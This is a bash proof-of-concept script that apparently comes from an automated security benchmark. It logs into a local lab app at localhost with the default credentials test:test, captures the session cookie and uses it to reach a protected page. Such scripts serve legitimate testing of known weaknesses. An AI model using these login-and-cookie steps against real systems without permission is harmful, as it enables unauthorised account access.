#!/bin/bash
# POC: Demonstrates authentication bypass using default credentials (test:test) in the login form
# Target: ./repo
# Created: 2025-11-07T17:02:54.998Z
# Session: benchmark-XBEN-063-24-mhp3aptq

# Default Credentials Vulnerability POC
# Tests authentication with default credentials test:test

TARGET_URL="http://localhost:32768/login"
HOME_URL="http://localhost:32768/home"

echo "=========================================="
echo "Default Credentials Vulnerability POC"
echo "=========================================="
echo ""

# Test 1: Attempt login with default credentials
echo "[*] Step 1: Attempting login with default credentials (test:test)..."
echo "[*] Target: $TARGET_URL"
echo ""

RESPONSE=$(curl -s -X POST \
  -d "username=test&password=test" \
  -i \
  "$TARGET_URL" 2>&1)

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Extract session cookie
SESSION_COOKIE=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | grep "session=" | sed 's/.*session=\([^;]*\).*/\1/')

if [ -z "$SESSION_COOKIE" ]; then
    echo "[-] FAILED: No session cookie found in response"
    echo "[!] Login with default credentials was unsuccessful"
    exit 1
fi

echo "[+] SUCCESS: Session cookie obtained: $SESSION_COOKIE"
echo ""

# Test 2: Verify authenticated access
echo "[*] Step 2: Verifying authenticated access to protected resource..."
echo "[*] Target: $HOME_URL"
echo ""

AUTH_RESPONSE=$(curl -s -b "session=$SESSION_COOKIE" "$HOME_URL")

echo "[*] Response from /home:"
echo "$AUTH_RESPONSE"
echo ""

# Check if authentication was successful
if echo "$AUTH_RESPONSE" | grep -q "Welcome"; then
    echo "[+] SUCCESS: Authenticated access confirmed!"
    echo "[+] VULNERABILITY CONFIRMED: Default credentials allow full application access"
    echo ""
    echo "=========================================="
    echo "VULNERABILITY CONFIRMED"
    echo "=========================================="
    exit 0
else
    echo "[-] Could not confirm authenticated access"
    exit 1
fi